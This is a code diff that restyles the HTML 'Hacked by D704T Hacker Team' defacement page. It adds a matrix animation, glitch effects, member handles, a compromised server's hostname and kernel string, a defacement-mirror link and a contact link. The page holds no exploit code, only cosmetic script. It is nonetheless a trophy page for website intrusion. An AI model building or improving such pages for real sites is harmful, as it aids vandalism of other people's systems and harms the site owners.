@@ -3,109 +3,168 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Official page of D704T Hacker Team - Modern Deface Template" />
-  <meta name="keywords" content="Hacked, Deface, Cyber Security, Hacker Team" />
+  <meta name="description" content="Hacked by D704T Hacker Team - Elite International Page" />
+  <meta name="keywords" content="Hacked, Deface, Cybersecurity, Hacker Team" />
   <meta name="author" content="D704T Hacker Team" />
   <meta property="og:title" content="Hacked by D704T Hacker Team" />
   <meta property="og:image" content="https://zonehmirrors.org/defaced/2017/01/05/kepfacil.com/s-media-cache-ak0.pinimg.com/originals/9d/5e/09/9d5e09084c9a60409b6ee2e2688f5315.jpg" />
-  <meta property="og:description" content="We are D704T Hacker Team" />
-  <meta property="og:type" content="website" />
-
+  <meta property="og:description" content="We are D704T Hacker Team - International Hacker Movement" />
   <title>Hacked by D704T Hacker Team</title>
-  <link rel="icon" href="https://zonehmirrors.org/defaced/2017/01/05/kepfacil.com/s-media-cache-ak0.pinimg.com/originals/9d/5e/09/9d5e09084c9a60409b6ee2e2688f5315.jpg" type="image/jpeg" />
-  <link href="https://fonts.googleapis.com/css2?family=Sedgwick+Ave&family=Covered+By+Your+Grace&display=swap" rel="stylesheet" />
-
+  <link rel="icon" href="https://zonehmirrors.org/defaced/2017/01/05/kepfacil.com/s-media-cache-ak0.pinimg.com/originals/9d/5e/09/9d5e09084c9a60409b6ee2e2688f5315.jpg" />
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Covered+By+Your+Grace&display=swap" rel="stylesheet" />
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
-
-    body {
-      font-family: 'Sedgwick Ave', cursive;
-      background-color: #000;
+    html, body {
+      height: 100%;
+      background: #000;
       color: #fff;
-      text-align: center;
-      padding: 2rem;
+      font-family: 'Share Tech Mono', monospace;
       overflow-x: hidden;
     }
-
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle, rgba(0,255,0,0.2) 0%, rgba(0,0,0,0.9) 80%);
+      z-index: -2;
+    }
+    #matrix {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      opacity: 0.2;
+    }
     .container {
       max-width: 900px;
       margin: 0 auto;
+      text-align: center;
+      padding: 4rem 1rem;
     }
-
     h1 {
       font-family: 'Covered By Your Grace', cursive;
       font-size: 3rem;
       text-shadow: 0 0 10px red, 0 0 20px red;
-      margin-bottom: 1rem;
+      animation: glitch 2s infinite;
     }
-
+    @keyframes glitch {
+      0% { text-shadow: 0 0 5px red; }
+      50% { text-shadow: 2px 2px 5px red, -2px -2px 5px lime; }
+      100% { text-shadow: 0 0 5px red; }
+    }
     .hacked-image {
       max-width: 100%;
       height: auto;
-      box-shadow: 0 0 20px darkred;
       border-radius: 12px;
-      margin: 1.5rem 0;
+      box-shadow: 0 0 30px darkred;
+      margin: 2rem 0;
     }
-
     .team-info {
-      font-size: 1.2rem;
+      font-size: 1.1rem;
       color: #ccc;
-      text-shadow: 0 0 3px white, 0 0 5px grey;
-    }
-
-    .team-names {
-      color: darkred;
-      font-weight: bold;
       margin: 1rem 0;
     }
-
+    .team-names {
+      color: #00ff00;
+      font-weight: bold;
+      margin-top: 1rem;
+      text-shadow: 0 0 3px #00ff00;
+    }
+    .buttons {
+      margin-top: 2rem;
+    }
+    .btn {
+      display: inline-block;
+      margin: 0.5rem;
+      padding: 0.7rem 1.5rem;
+      background: #111;
+      border: 2px solid lime;
+      color: lime;
+      font-weight: bold;
+      border-radius: 8px;
+      transition: 0.3s;
+      text-decoration: none;
+    }
+    .btn:hover {
+      background: lime;
+      color: #111;
+    }
     footer {
       margin-top: 3rem;
       font-size: 0.9rem;
       color: #888;
     }
-
-    a {
-      color: crimson;
-      text-decoration: none;
-    }
-
     @media (max-width: 768px) {
-      h1 {
-        font-size: 2rem;
-      }
-
-      .team-info {
-        font-size: 1rem;
-      }
+      h1 { font-size: 2rem; }
+      .team-info { font-size: 1rem; }
     }
   </style>
 </head>
-
 <body>
+  <canvas id="matrix"></canvas>
+
   <div class="container">
     <h1>Hacked By D704T Hacker Team</h1>
     <img src="https://zonehmirrors.org/defaced/2017/01/05/kepfacil.com/s-media-cache-ak0.pinimg.com/originals/9d/5e/09/9d5e09084c9a60409b6ee2e2688f5315.jpg" alt="Hacked Image" class="hacked-image" />
-    
-    <p class="team-info">
-      [ ! ] WE ARE D704T [ ! ]
-      <br />
-      <span class="team-names">
-        Desktop77N3T · XRyukz · Ng1ndex · Boss Ranzen · Mr.xbarakuda · N4ST4R_ID · Zipers404 · ./BarBarking · Mantoed · ![F]Sn1per-X · CyberPunks · Syntax7 · ShuzuID
-      </span>
-    </p>
+
+    <p class="team-info">[ ! ] WE ARE D704T [ ! ]</p>
+    <div class="team-names">
+      Desktop77N3T · XRyukz · Ng1ndex · Boss Ranzen · Mr.xbarakuda · N4ST4R_ID · Zipers404 · ./BarBarking · Mantoed · ![F]Sn1per-X · CyberPunks · Syntax7 · ShuzuID
+    </div>
 
     <p class="team-info">Linux srv130.niagahoster.com · Kernel 4.18.0-553 · x86_64 · SMP 2024</p>
     <p class="team-info"><em><u>- IndonesianPeople -</u></em></p>
 
+    <div class="buttons">
+      <a href="https://archive.ph/EecOU" target="_blank" class="btn">View Mirror</a>
+      <a href="https://www.facebook.com/profile.php?id=61551950731736" target="_blank" class="btn">Contact Admin</a>
+    </div>
+
     <footer>
-      Mirror: <a href="https://archive.ph/EecOU" target="_blank">Zone Archive</a><br />
-      Contact: <a href="https://www.facebook.com/profile.php?id=61551950731736" target="_blank">Facebook</a>
+      &copy; 2025 D704T Hacker Team - All Rights Reserved
     </footer>
   </div>
+
+  <script>
+    // Simple matrix animation background
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
+
+    const letters = '01';
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+    const drops = Array.from({ length: columns }, () => 1);
+
+    function drawMatrix() {
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = '#0F0';
+      ctx.font = fontSize + 'px monospace';
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
+      }
+    }
+
+    setInterval(drawMatrix, 35);
+    window.addEventListener('resize', () => location.reload());
+  </script>
 </body>
 </html>
